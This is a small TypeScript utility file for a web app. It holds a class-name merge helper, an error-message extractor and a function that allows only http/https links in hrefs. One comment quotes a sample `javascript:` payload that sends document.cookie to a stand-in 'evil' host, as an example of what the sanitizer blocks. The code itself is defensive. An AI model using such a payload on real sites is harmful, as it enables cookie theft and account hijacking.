import { type ClassValue, clsx } from "clsx";
import { twMerge } from "tailwind-merge";

export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

/**
 * Extracts a human-readable message from any thrown value.
 * Handles native Errors, Supabase PostgrestErrors (which have a .message
 * but are not instanceof Error), and plain strings.
 */
export function getErrorMessage(err: unknown): string {
  if (!err) return "Something went wrong";
  if (typeof err === "string") return err;
  if (typeof err === "object" && "message" in err && typeof (err as { message: unknown }).message === "string") {
    return (err as { message: string }).message;
  }
  return "Something went wrong";
}

/**
 * Returns the URL only if it is a safe http/https link, else null. Use this
 * before putting any user-influenced value into an <a href>. React does NOT
 * sanitize `javascript:` / `data:` hrefs, so a stored value like
 * `javascript:fetch('//evil/?c='+document.cookie)` would execute on click.
 */
export function safeHttpUrl(value: string | null | undefined): string | null {
  if (!value) return null;
  return /^https?:\/\//i.test(value.trim()) ? value : null;
}
